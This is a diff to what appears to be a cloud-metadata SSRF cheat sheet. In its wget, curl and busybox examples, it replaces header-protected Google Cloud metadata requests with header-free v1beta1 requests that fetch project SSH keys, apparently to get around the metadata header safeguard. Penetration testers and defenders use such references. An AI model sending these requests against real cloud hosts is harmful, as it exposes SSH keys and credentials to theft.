@@ -86,7 +86,7 @@ wget -q -O - http://169.254.169.254/metadata/v1/
 Google
 
 ```
-wget --header="Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys?alt=json
+wget http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
 ```
 
 Azure
@@ -118,7 +118,7 @@ curl http://169.254.169.254/metadata/v1/
 Google
 
 ```
-curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys?alt=json
+curl http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
 ```
 
 Azure
@@ -147,7 +147,7 @@ busybox wget -q -O - http://169.254.169.254/metadata/v1/
 Google
 
 ```
-busybox wget --header="Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys?alt=json
+busybox wget http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
 ```
 
 Azure
